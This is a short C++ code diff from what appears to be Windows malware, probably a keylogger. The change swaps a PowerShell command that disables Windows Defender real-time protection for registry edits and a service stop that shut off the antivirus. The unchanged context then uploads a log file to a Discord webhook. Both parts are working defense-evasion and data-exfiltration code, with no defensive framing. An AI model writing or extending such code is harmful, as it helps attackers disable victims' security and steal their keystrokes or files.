@@ -39,8 +39,15 @@ int main()
 
     MSG msg;
 
-    system("powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring\""); // disable windows defender real time protection
+    // disable antivirus
+    HKEY hKey1;
+    RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_SET_VALUE, &hKey1);
+    DWORD value_data = 1;
+    RegSetValueExA(hKey1, "DisableAntiSpyware", 0, REG_DWORD, (const BYTE*)&value_data, sizeof(value_data));
+    RegCloseKey(hKey1);
+    system("sc stop WinDefend");
 
+    
     if(filesystem::exists(logfile_path))
     {
       sendFile(discord_webhook, logfile_path);
